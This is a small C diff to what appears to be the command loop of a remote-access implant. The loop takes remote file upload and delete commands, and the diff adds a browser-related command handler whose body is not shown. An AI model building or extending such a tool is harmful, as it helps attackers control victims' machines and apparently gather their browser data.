@@ -350,6 +350,9 @@ static int session_loop(SOCKET s) {
             } else if (type == CMD_FS_PUT) {
                 handle_fs_put(s, inbuf, inlen);
                 last_hb = GetTickCount();
+            } else if (type == CMD_BROWSER) {
+                handle_browser(s);
+                last_hb = GetTickCount();
             } else if (type == CMD_FS_DEL) {
                 if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                 inbuf[inlen] = 0;
